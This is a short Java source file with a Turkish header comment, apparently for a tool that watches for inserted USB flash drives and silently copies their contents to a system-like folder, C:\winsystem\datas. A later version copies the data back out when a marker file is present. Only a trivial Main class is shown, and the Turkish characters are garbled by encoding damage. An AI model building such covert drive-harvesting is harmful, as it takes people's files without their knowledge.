/*
 * i� bu t�m haklar� Recai Furkan Bostanc�ya aittir
 * bu versiyon �nceki format�n ac�s�na binaen daha g�zel geli�tirlmi�tir.
 * �nceki vrrsiyonda pc de flash� ��karmak gerekiyordu ama bunda ona gerek yok
 * bu versiyon format sonras� versiyondur.
 * v-1.0.0
 * Flashscanner s�n�f� pcye flash tak�ld� m� ��kart�ld� m� diye bakar
 * e�er
 * tak�lm��sa kopyalamaya ba�lar
 * e�er ��kart�lm��sa bi�ey yapmaz ne yaps�n yani
 * ayn�ysa zaten bi�ey yapmaz
 * bizim i�in �nemli olan yeni bir flash eklenmi� mi eklenmemi� mi onu ��renmek
 * 
 * baba version1.0.1 yay�nland�
 * bu versiyonda geri kendi kendine kopyalama �zelli�i eklendi
 * �al��ma prensibi flasta ownFalsh.txt var m� diye bak�yor
 * varsa winsystem datas i�indekileri f�n�yor
 * i�inde kopyala.txt varsa onu al�p flasha kopyal�yor
 * yoksa devam bulana kadar ararr i�te�
 * 
 * version 1.0.2 yay�nland� ayn� g�n
 * flas i�inde durum bilgisi veriyor kopyalamyla ilgili
 * kopyalama an�nda kopyalan�yor diye dosya olu�turmakta
 * tamjamd���nda tamamland� diye klas�r olu�turmakta
 * 
 * 
 * 
 */

package FlashCopier;

public class Main {
	public static String destPath = "C:\\winsystem\\datas";

	public static void main(String[] args) {
		FlashScanner scanner = new FlashScanner();
		scanner.waitForNotifying();

	}

}
